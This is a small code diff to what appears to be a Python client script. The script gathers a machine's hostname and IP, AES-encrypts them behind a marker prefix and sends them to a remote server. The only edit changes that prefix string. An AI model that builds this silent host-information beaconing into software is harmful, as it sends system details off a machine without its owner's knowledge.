@@ -139,7 +139,7 @@ try:
         data = grab_info()
 
         # encrypt the data
-        data = "BDSOSSEC" + data.rstrip()
+        data = "BNCOSSEC" + data.rstrip()
         data = aescall(secret, data, "encrypt")
         print ("[*] Pulled hostname and IP, encrypted data, and now sending to server.")
         s.send(data) 
